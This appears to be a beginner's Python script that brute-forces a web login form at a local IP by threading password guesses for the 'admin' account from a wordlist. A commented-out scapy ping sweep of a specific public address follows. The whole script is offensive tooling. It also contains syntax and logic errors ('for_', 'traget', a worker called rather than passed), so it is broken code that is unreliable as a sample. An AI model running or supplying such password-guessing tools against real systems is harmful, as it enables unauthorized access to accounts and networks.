import requests
import threading
from queue import Queue

url = "http://192.168.1.10/login"
found = threading.Event()

def try_loging(password):
    if found.is_set():
        return
    r = requests.post(url,data={'user':"admin","pass":password})
    if 'Welcome' in r.text:
        print("loggin successful")
        found.set()
with open('password.txt') as f :
    q = Queue()
    for line in f :
        q.put(line.strip())
def worker():
    while not q.empty() and not found.is_set():
        try_loging(q.get())
        q.task_done()
threads = [threading.Thread(traget= worker()) for_ in range(10)]
for t in threads:
    t.start()
                            
for t in threads:
    t.join()
                            






















# /////////////////////////////// EXAMPLES
# from scapy.all import *
# import logging
# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


# net = '185.143.233.238'
# ans , unans = sr(IP(dst=net)/ICMP(),timeout=1,verbose=0)
# for sent,recv in ans:
#     print(f"[+] Host up: {recv[IP].src}")
